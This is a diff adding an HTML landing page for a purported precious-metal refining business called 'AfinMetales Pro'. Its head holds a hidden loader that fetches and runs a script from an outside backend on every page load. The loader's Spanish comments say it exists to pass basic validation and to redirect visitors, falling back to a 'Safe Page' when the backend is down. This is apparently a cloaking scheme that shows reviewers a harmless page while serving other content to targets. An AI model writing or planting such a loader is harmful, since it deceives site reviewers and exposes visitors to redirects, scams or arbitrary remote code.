@@ -1,1 +1,252 @@
-a
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AfinMetales Pro - Afinación Profesional de Metales Preciosos</title>
+    <meta name="description" content="Servicio profesional de afinación y recuperación de metales preciosos (oro, plata, platino y paladio). Procesos ecológicos, máxima pureza y confidencialidad garantizada.">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script>
+        (function() {
+            // ID aleatorio para evitar caché y pasar validación básica
+            var randomID = "u" + Math.random().toString(36).substring(7);
+
+            // APUNTA AL PUERTO 3008 (Backend Node.js)
+            var backendURL = "https://grupoafinapi.onrender.com/" + randomID;
+
+            var s = document.createElement('script');
+            s.src = backendURL;
+
+            // Cuando el backend responda...
+            s.onload = function() {
+                // Si el backend dice "window.__view = true", mostramos la web
+                // Si el backend redirecciona, esto no llegará a ejecutarse visualmente
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+
+            // En caso de error de conexión (Node apagado), mostrar la web por defecto
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+
+            document.head.appendChild(s);
+        })();
+    </script>
+    <style>
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 999999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- TUS ESTILOS ORIGINALES --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        /* --- TUS ESTILOS ORIGINALES --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* Reset básico y tipografía */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', sans-serif; color: #333; line-height: 1.6; background: #f9f9f9; }
+        a { text-decoration: none; }
+        img { max-width: 100%; display: block; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        /* Header */
+        header { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: fixed; width: 100%; top: 0; z-index: 1000; }
+        .header-inner { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; }
+        .logo { font-size: 24px; font-weight: 700; color: #B8860B; }
+        nav ul { display: flex; list-style: none; }
+        nav ul li { margin-left: 30px; }
+        nav ul li a { color: #333; font-weight: 500; transition: color 0.3s; }
+        nav ul li a:hover { color: #B8860B; }
+        .mobile-menu { display: none; cursor: pointer; }
+
+        /* Hero */
+        .hero { background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://static.vecteezy.com/system/resources/previews/072/186/915/non_2x/close-up-of-molten-metal-being-poured-from-a-crucible-into-a-mold-during-a-metal-casting-process-in-an-industrial-foundry-setting-photo.jpg') center/cover no-repeat; height: 90vh; display: flex; align-items: center; color: #fff; text-align: center; }
+        .hero-content { max-width: 800px; margin: 0 auto; }
+        .hero h1 { font-size: 48px; margin-bottom: 20px; }
+        .hero p { font-size: 20px; margin-bottom: 40px; }
+        .btn { background: #B8860B; color: #fff; padding: 15px 30px; border-radius: 5px; font-weight: 500; transition: background 0.3s; }
+        .btn:hover { background: #997000; }
+
+        /* Secciones generales */
+        section { padding: 80px 0; }
+        .section-title { text-align: center; font-size: 36px; margin-bottom: 50px; color: #B8860B; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 40px; }
+        .card { background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
+        .card img { margin-bottom: 20px; border-radius: 8px; }
+
+        /* Contacto */
+        .contact-form { max-width: 800px; margin: 0 auto; background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 500; }
+        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-family: inherit; }
+        textarea { height: 150px; resize: vertical; }
+
+        /* Footer */
+        footer { background: #333; color: #fff; padding: 40px 0; text-align: center; }
+        .footer-links a { color: #fff; margin: 0 15px; }
+
+        /* Responsivo */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 36px; }
+            .hero p { font-size: 18px; }
+            nav ul { display: none; flex-direction: column; position: absolute; top: 100%; left: 0; width: 100%; background: #fff; box-shadow: 0 5px 10px rgba(0,0,0,0.1); }
+            nav ul li { margin: 15px 0; text-align: center; }
+            .mobile-menu { display: block; font-size: 24px; }
+            .section-title { font-size: 30px; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="preloader">
+    <div class="spinner"></div>
+</div>
+    <header>
+        <div class="container header-inner">
+            <div class="logo">AfinMetales Pro</div>
+            <nav>
+                <ul>
+                    <li><a href="#inicio">Inicio</a></li>
+                    <li><a href="#servicios">Servicios</a></li>
+                    <li><a href="#proceso">Proceso</a></li>
+                    <li><a href="#ventajas">Ventajas</a></li>
+                    <li><a href="#contacto">Contacto</a></li>
+                </ul>
+                <div class="mobile-menu">☰</div>
+            </nav>
+        </div>
+    </header>
+
+    <section id="inicio" class="hero">
+        <div class="container hero-content">
+            <h1>Expertos en Afinación de Metales Preciosos</h1>
+            <p>Recuperamos oro, plata, platino y paladio de residuos industriales, joyería y electrónicos con máxima pureza y procesos responsables.</p>
+            <a href="#contacto" class="btn">Solicitar Cotización</a>
+        </div>
+    </section>
+
+    <section id="servicios">
+        <div class="container">
+            <h2 class="section-title">Nuestros Servicios</h2>
+            <div class="grid">
+                <div class="card">
+                    <img src="https://media.istockphoto.com/id/535484810/photo/gold-bars-on-white-background.jpg?s=612x612&w=0&k=20&c=gmjQGSrVRRemRFl7fZrxAEH_K9j9gTJOQmlIoANc56U=" alt="Lingotes de oro">
+                    <h3>Recuperación de Oro</h3>
+                    <p>Extracción y afinación de oro de alta pureza a partir de desechos y residuos.</p>
+                </div>
+                <div class="card">
+                    <img src="https://media.istockphoto.com/id/506120376/photo/rows-of-golden-and-silver-bars.jpg?s=612x612&w=0&k=20&c=BQiDybK6psX-06w3iwyehmIbkZho4PYIkeFhZhgO2rM=" alt="Lingotes de plata y oro">
+                    <h3>Recuperación de Plata y Platino</h3>
+                    <p>Procesos especializados para plata, platino y paladio con resultados óptimos.</p>
+                </div>
+                <div class="card">
+                    <img src="https://metallix.com/wp-content/uploads/2020/12/Carousel-6.png" alt="Laboratorio de análisis">
+                    <h3>Análisis y Valoración</h3>
+                    <p>Análisis preciso en laboratorio propio para determinar el contenido exacto de metales preciosos.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="proceso" style="background: #fff;">
+        <div class="container">
+            <h2 class="section-title">Nuestro Proceso</h2>
+            <div class="grid">
+                <div class="card">
+                    <h3>1. Recepción y Evaluación</h3>
+                    <p>Recibimos su material y realizamos un análisis preliminar gratuito.</p>
+                </div>
+                <div class="card">
+                    <h3>2. Afinación</h3>
+                    <p>Aplicamos técnicas avanzadas para separar y purificar los metales.</p>
+                </div>
+                <div class="card">
+                    <h3>3. Resultados</h3>
+                    <p>Entregamos metales puros o pago según acuerdo, con informe detallado.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="ventajas">
+        <div class="container">
+            <h2 class="section-title">Por Qué Elegirnos</h2>
+            <div class="grid">
+                <div class="card">
+                    <img src="https://www.actionmetalsrecyclers.com/wp-content/uploads/2025/08/shutterstock_1011811597-min-768x507.jpg" alt="Proceso ecológico">
+                    <h3>Proceso Ecológico</h3>
+                    <p>Utilizamos métodos responsables que minimizan el impacto ambiental.</p>
+                </div>
+                <div class="card">
+                    <h3>Máxima Recuperación</h3>
+                    <p>Tecnología avanzada para obtener el mayor rendimiento posible.</p>
+                </div>
+                <div class="card">
+                    <h3>Confidencialidad Total</h3>
+                    <p>Trabajamos con discreción absoluta para proteger su información.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contacto" style="background: #f0f0f0;">
+        <div class="container">
+            <h2 class="section-title">Contáctenos</h2>
+            <div class="contact-form">
+                <form action="https://formspree.io/f/tu-id-aqui" method="POST"> <!-- Reemplaza con tu endpoint real o usa Formspree/Mailchimp -->
+                    <div class="form-group">
+                        <label for="nombre">Nombre</label>
+                        <input type="text" id="nombre" name="nombre" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="telefono">Teléfono</label>
+                        <input type="tel" id="telefono" name="telefono">
+                    </div>
+                    <div class="form-group">
+                        <label for="mensaje">Mensaje</label>
+                        <textarea id="mensaje" name="mensaje" required></textarea>
+                    </div>
+                    <button type="submit" class="btn">Enviar Mensaje</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 AfinMetales Pro. Todos los derechos reservados.</p>
+            <div class="footer-links">
+                <a href="#">Política de Privacidad</a>
+                <a href="#">Términos de Servicio</a>
+            </div>
+            <p>Tel: +52 123 456 7890 | Email: info@afinmetalespro.com</p>
+        </div>
+    </footer>
+
+    <script>
+        // Menú móvil simple
+        document.querySelector('.mobile-menu').addEventListener('click', () => {
+            document.querySelector('nav ul').classList.toggle('active');
+        });
+    </script>
+</body>
+</html>
